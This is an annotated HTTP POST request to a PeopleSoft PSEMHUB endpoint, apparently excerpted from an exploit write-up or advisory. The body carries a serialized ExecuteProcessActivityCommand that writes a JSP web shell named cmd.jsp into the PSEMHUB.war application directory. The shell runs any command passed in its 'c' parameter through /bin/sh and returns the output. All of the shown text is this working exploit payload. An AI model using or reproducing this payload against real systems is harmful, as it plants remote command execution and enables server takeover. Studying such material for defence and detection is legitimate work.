POST /PSEMHUB/hub HTTP/1.1 // [1]
Content-Type: application/x-www-form-urlencoded
...
Host: 127.0.0.1:8000 // [2]
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-length: 1903

Message= {
      _command: ExecuteProcessActivityCommand {
          m_isStdOutput  = true
          m_line         = "<%@page import="java.util.*,java.io.*"%> // [3]
                            <% if (request.getParameter("c") != null) {
                                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});
                                Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\\\A");
                                out.println(s.hasNext() ? s.next() : "");
                                p.destroy();
                            }%>"
          m_targetFile   = File("/home/psadm2/psft/pt/8.62/webserv/peoplesoft/applications/peoplesoft/PSEMHUB.war/cmd.jsp") // [4]
          m_logWriter    = null
      }
      ...
  }
